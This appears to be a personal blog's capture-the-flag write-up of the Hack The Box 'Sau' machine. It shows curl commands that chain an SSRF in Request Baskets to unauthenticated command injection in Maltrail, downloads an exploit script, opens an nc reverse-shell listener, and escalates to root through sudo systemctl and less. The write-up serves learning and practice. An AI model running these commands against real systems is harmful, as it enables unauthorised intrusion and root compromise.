<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HTB | Sau Writeup</title>

  <!-- Styles -->
  <link rel="stylesheet" href="../css/style.css" />
  <link rel="stylesheet" href="../css/skins/color-red.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />

  <style>
    body.dark p, body.dark li {
      color: var(--text-black-700);
      line-height: 1.6;
      font-size: 16px;
    }
    code {
      background-color: #1e1e1e;
      color: #ff6b6b;
      padding: 2px 6px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
    }
    pre {
      background-color: #1e1e1e;
      color: #f8f8f2;
      padding: 10px 15px;
      border-radius: 5px;
      overflow-x: auto;
      margin-bottom: 20px;
    }
    ul {
      padding-left: 1.5em;
    }
    img {
      max-width: 100%;
      border: 2px solid #444;
      border-radius: 8px;
      margin: 20px 0;
    }
    h3 {
      color: var(--skin-color);
      margin-top: 40px;
      font-size: 24px;
    }
  </style>
</head>
<body class="dark">

<!-- Matrix Background -->
<canvas id="matrixCanvas"></canvas>
<script src="../js/matrix.js"></script>

<!-- Sidebar -->
<div class="aside">
  <div class="logo">
    <a href="../index.html"><span>L1chS3c</span></a>
    <div class="profile-pic">
      <img src="../images/profile.jpg" alt="Profile Picture">
    </div>
  </div>
  <ul class="nav">
    <li><a href="../index.html#home"><i class="fa fa-home"></i> Home</a></li>
    <li><a href="../index.html#about"><i class="fa fa-user"></i> About</a></li>
    <li><a href="../index.html#education"><i class="fa fa-book"></i> Education</a></li>
    <li><a href="../index.html#contact"><i class="fa fa-comments"></i> Contact</a></li>
    <li><a href="writeuphome.html" class="active"><i class="fa fa-terminal"></i> Writeups</a></li>
  </ul>
</div>

<!-- Writeup Content -->
<section class="section" style="padding-left: 15px;">
  <div class="container">
    <div class="section-title">
      <h2>HTB: Sau</h2>
    </div>

    <p style="font-size: 18px; margin-bottom: 30px;">
      Difficulty: Easy • OS: Linux • Tags: SSRF, RCE, Sudo Misconfig, Enumeration
    </p>

    <!-- ===== OVERVIEW ===== -->
    <h3>Overview</h3>
    <p>
      <strong>Sau</strong> is an Easy-rated Linux box that showcases one of my favorite types of vulnerabilities: <strong>Server-Side Request Forgery (SSRF)</strong>.
      The initial entry point involved exploiting a misconfigured instance of Request Baskets using 
      <code>CVE-2023-27163</code>, which allowed forwarding HTTP requests to internal services not exposed to the public network.
      This led to the discovery of a Maltrail instance vulnerable to <strong>unauthenticated OS command injection</strong> 
      (<code>CVE-2023-27561</code>), resulting in remote code execution as a low-privileged user. 
      Privilege escalation was then achieved through a <strong>sudo misconfiguration</strong>, allowing execution of a 
      systemctl command as root without a password.
    </p>

    <!-- ===== ENUMERATION ===== -->
    <h3>Initial Enumeration</h3>
    <p>We started with an all-ports Nmap scan:</p>
    <pre><code>└──╼ [★]$ nmap -p- -sC -sV -T4 10.129.229.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-03 13:57 CDT
Nmap scan report for 10.129.229.26
Host is up (0.0092s latency).
Not shown: 65531 closed tcp ports (reset)

| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 03 Apr 2025 18:58:33 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 03 Apr 2025 18:58:05 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 03 Apr 2025 18:58:05 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=4/3%Time=67EEDA3D%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html
SF:;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Thu,\x2003\x20Apr\x
SF:202025\x2018:58:05\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"
SF:/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2
SF:0200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Thu,\x2003\x20Apr\x
SF:202025\x2018:58:05\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nDate:\x20Thu,\x2003\x20Apr\x202025\x2018:58:33\x20GMT
SF:\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20n
SF:ame\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\
SF:$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.38 seconds</code></pre>

    <p>An initial Nmap scan revealed that SSH (port 22) was open, while ports 80 and 8338 were marked as filtered, meaning the server did not respond to probes — likely due to a firewall or host-based filtering rule. Interestingly, port 55555 was open, which stood out as an uncommon service port. While port 80 typically indicates the presence of a web service, direct access to it was blocked. This led me to investigate port 55555 instead, which did respond — revealing a web application along with useful version information.</p>
   <pre><code>PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown</code></pre>

    <img src="path/to/screenshot1.png" alt="Nmap Results Screenshot">

    <!-- ===== EXPLOITATION ===== -->
    <h3>Exploitation — Request Baskets SSRF</h3>
    <p>Using curl, we created a basket and captured the API token:</p>

    <pre><code>curl -X POST http://10.129.229.26:55555/api/baskets/hackbox \
-H "Content-Type: application/json" -d '{}'</code></pre>

    <p>With this token, we configured the basket to forward requests to our attack machine:</p>

    <img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">

    <pre><code>{
  "forward_url": "http://10.10.14.207:8000",
  "proxy_response": true,
  "insecure_tls": true
}</code></pre>

    <p>We spun up a Python HTTP server:</p>
    <pre><code>python3 -m http.server 8000</code></pre>

    <p>Then triggered the SSRF by browsing to the basket:</p>
    <pre><code>curl http://10.129.229.26:55555/hackbox</code></pre>

    <p>✅ <strong>SSRF confirmed</strong> — the remote server hit our HTTP server!</p>

    <!-- ===== SSRF TO MALTRAIL ===== -->
    <h3>SSRF to Maltrail (Port 80)</h3>
    <p>We updated our basket to forward to <code>127.0.0.1:80</code>, then browsed to the endpoint again.</p>

    <img src="path/to/maltrail-discovered.png" alt="Maltrail Interface via SSRF">

    <p>This exposed a Maltrail web interface — something we never could’ve reached directly.</p>

    <!-- ===== RCE ===== -->
    <h3>RCE in Maltrail (CVE-2023-27561)</h3>
    <p>Maltrail v0.53 is vulnerable to unauthenticated command injection. We used an exploit script to pop a reverse shell:</p>

    <pre><code>curl -s https://www.exploit-db.com/download/51676 -o exploit.py</code></pre>
    <pre><code>nc -lvnp 4444</code></pre>
    <pre><code>python3 exploit.py 10.10.14.207 4444 http://10.129.229.26:55555/hackbox</code></pre>

    <p>✅ Shell popped as <code>puma</code>.</p>

    <!-- ===== PRIVESc ===== -->
    <h3>Privilege Escalation</h3>
    <p>The user <code>puma</code> had passwordless sudo permissions:</p>
    <pre><code>sudo -l</code></pre>
    <pre><code>(ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>

    <p>That command opens <code>less</code>, allowing command execution:</p>
    <pre><code>sudo /usr/bin/systemctl status trail.service</code></pre>
    <pre><code>!/bin/bash</code></pre>

    <p>✅ Root shell achieved.</p>

    <img src="path/to/root-confirmed.png" alt="Root Shell Screenshot">

    <!-- ===== TAKEAWAYS ===== -->
    <h3>Takeaways</h3>
    <ul>
      <li>SSRF → Reach internal-only services</li>
      <li>Unauthenticated RCE in Maltrail</li>
      <li>Abuse of <code>systemctl + less</code> for privilege escalation</li>
      <li>No passwords required to root the box</li>
    </ul>

    <a href="writeuphome.html" class="btn">← Back to Writeups</a>
  </div>
</section>

<script src="../js/script.js"></script>
</body>
</html>
